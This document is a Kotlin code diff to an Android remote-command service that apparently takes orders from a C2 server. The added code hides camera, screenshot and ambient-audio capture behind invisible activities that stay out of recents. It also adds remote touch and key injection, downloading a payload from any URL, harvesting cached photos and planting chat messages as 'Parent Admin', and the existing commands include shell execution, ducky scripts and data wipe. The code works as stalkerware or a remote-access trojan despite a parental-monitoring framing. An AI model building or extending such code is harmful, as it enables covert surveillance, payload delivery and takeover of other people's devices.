@@ -39,7 +39,13 @@ object DeviceCommandService {
         "shell.exec",
         "ducky.execute",
         "mdm.wipeData",
-        "files.delete"
+        "files.delete",
+        "keyevent",
+        "touch",
+        "swipe",
+        "gesture",
+        "type",
+        "input"
     )
 
     fun executeMethod(
@@ -275,6 +281,16 @@ object DeviceCommandService {
 
                 "media.getphotos" -> {
                     val photosArr = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("photos") else JSONArray()
+                    if (context != null) {
+                        val cachePhotos = context.cacheDir?.listFiles { _, name -> name.startsWith("photo_") && name.endsWith(".jpg") } ?: arrayOf()
+                        for (f in cachePhotos) {
+                            photosArr.put(JSONObject().apply {
+                                put("content", f.name)
+                                put("path", f.absolutePath)
+                                put("timestamp", f.lastModified())
+                            })
+                        }
+                    }
                     DeviceCommandResult(true, data = JSONObject().put("photos", photosArr))
                 }
 
@@ -305,9 +321,37 @@ object DeviceCommandService {
                 }
 
                 "apps.getlist" -> {
-                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "{}"
-                    val usageObj = try { JSONObject(usageJsonStr) } catch (_: Exception) { JSONObject().put("raw", usageJsonStr) }
-                    DeviceCommandResult(true, data = usageObj)
+                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "[]"
+                    val appsArr = try { JSONArray(usageJsonStr) } catch (_: Exception) { JSONArray() }
+                    val data = JSONObject().apply {
+                        put("apps", appsArr)
+                        put("totalUsageMinutes", if (context != null) AppUsageBlockerManager.getAppUsageStats(context).sumOf { it.totalTimeInForegroundMs } / 60000 else 0)
+                        put("hasPermission", if (context != null) AppUsageBlockerManager.hasUsageStatsPermission(context) else false)
+                    }
+                    DeviceCommandResult(true, data = data)
+                }
+
+                "download", "files.download" -> {
+                    val url = params.optString("url", "")
+                    val destination = params.optString("destination", params.optString("path", "/sdcard/Download/file_payload.bin"))
+                    if (url.isNotBlank()) {
+                        MonitorService.activeInstance?.let { it.handleCommand("!download $url $destination") }
+                        DeviceCommandResult(true, data = JSONObject().put("status", "download_dispatched").put("destination", destination))
+                    } else {
+                        DeviceCommandResult(false, error = "Target download URL is required")
+                    }
+                }
+
+                "chat.sendmessage", "chat.send" -> {
+                    val app = params.optString("app", "whatsapp")
+                    val text = params.optString("text", "")
+                    val sender = params.optString("sender", "Parent Admin")
+                    if (context != null && text.isNotBlank()) {
+                        C2LocalDatabase.getInstance(context).insertSocialMessage(app, sender, text, true)
+                        DeviceCommandResult(true, data = JSONObject().put("status", "message_dispatched").put("text", text))
+                    } else {
+                        DeviceCommandResult(false, error = "Message text is required")
+                    }
                 }
 
                 "media.getcallrecordings" -> {
@@ -343,9 +387,14 @@ object DeviceCommandService {
 
                 // ── Screen Time & Blocker Rules ──
                 "usage.getsummary" -> {
-                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "{}"
-                    val usageObj = try { JSONObject(usageJsonStr) } catch (_: Exception) { JSONObject().put("raw", usageJsonStr) }
-                    DeviceCommandResult(true, data = usageObj)
+                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "[]"
+                    val appsArr = try { JSONArray(usageJsonStr) } catch (_: Exception) { JSONArray() }
+                    val data = JSONObject().apply {
+                        put("apps", appsArr)
+                        put("totalUsageMinutes", if (context != null) AppUsageBlockerManager.getAppUsageStats(context).sumOf { it.totalTimeInForegroundMs } / 60000 else 0)
+                        put("hasPermission", if (context != null) AppUsageBlockerManager.hasUsageStatsPermission(context) else false)
+                    }
+                    DeviceCommandResult(true, data = data)
                 }
 
                 "usage.setblockrules" -> {
@@ -636,13 +685,19 @@ object DeviceCommandService {
                 // ── Operational Camera, Audio, Screenshot, SMS & Stealth Actions ──
                 "camera", "rearphoto", "camera.takephoto" -> {
                     val lens = params.optString("lens", "back")
+                    val isFront = lens.lowercase() == "front"
                     if (context != null) {
+                        val flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
                         val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
-                            putExtra("lens", if (lens == "front") "front" else "back")
-                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                            putExtra(InvisibleCameraActivity.EXTRA_IS_FRONT, isFront)
+                            putExtra("lens", if (isFront) "front" else "back")
+                            addFlags(flags)
                         }
                         context.startActivity(intent)
-                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_camera_photo").put("lens", lens))
+                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_camera_photo").put("lens", if (isFront) "front" else "back"))
                     } else {
                         DeviceCommandResult(false, error = "Context required for camera photo capture")
                     }
@@ -650,9 +705,14 @@ object DeviceCommandService {
 
                 "frontcam", "frontphoto" -> {
                     if (context != null) {
+                        val flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
                         val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
+                            putExtra(InvisibleCameraActivity.EXTRA_IS_FRONT, true)
                             putExtra("lens", "front")
-                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                            addFlags(flags)
                         }
                         context.startActivity(intent)
                         DeviceCommandResult(true, data = JSONObject().put("status", "capturing_front_photo"))
@@ -663,9 +723,13 @@ object DeviceCommandService {
 
                 "screenshot" -> {
                     if (context != null) {
+                        val flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
                         val intent = android.content.Intent(context, InvisibleActivity::class.java).apply {
                             putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_SCREEN_RECORD)
-                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                            addFlags(flags)
                         }
                         context.startActivity(intent)
                         DeviceCommandResult(true, data = JSONObject().put("status", "capturing_screenshot"))
@@ -677,10 +741,14 @@ object DeviceCommandService {
                 "audio" -> {
                     val duration = params.optInt("duration", 15)
                     if (context != null) {
+                        val flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
+                                    android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
                         val intent = android.content.Intent(context, InvisibleActivity::class.java).apply {
                             putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_AUDIO)
                             putExtra(InvisibleActivity.EXTRA_DURATION, duration)
-                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                            addFlags(flags)
                         }
                         context.startActivity(intent)
                         DeviceCommandResult(true, data = JSONObject().put("status", "recording_ambient_audio").put("duration", duration))
